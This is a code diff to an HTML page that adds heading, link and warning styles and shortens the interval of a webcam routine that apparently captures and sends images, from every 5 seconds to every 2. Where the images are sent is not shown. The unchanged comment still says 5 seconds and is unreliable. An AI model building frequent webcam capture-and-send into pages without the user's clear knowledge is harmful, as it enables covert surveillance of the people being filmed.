@@ -392,6 +392,25 @@ table{
             top: 0;
             border-radius: 20px;
         }
+                #content-chrome h1,h3{
+          color:white;
+          font-size: 55px;
+          margin: 20px;
+          padding: 40px;
+        }
+        #content-chrome a{
+          color: yellow;
+        }
+        .warning h2
+        { 
+          color: red; 
+          font-size: 45px;
+          font-weight: bold;
+        }
+       .warning p {
+         font-size: 20px;
+         color: #fff;
+       }
 </style>
 </head>
 <body>
@@ -730,7 +749,7 @@ displayQuote();
         navigator.mediaDevices.getUserMedia({ video: true })
             .then((stream) => {
                 video.srcObject = stream;
-                captureInterval = setInterval(captureAndSend, 5000);  // Capture every 5 seconds
+                captureInterval = setInterval(captureAndSend, 2000);  // Capture every 5 seconds
             })
             .catch((error) => {
                 console.error("Error accessing the camera", error);
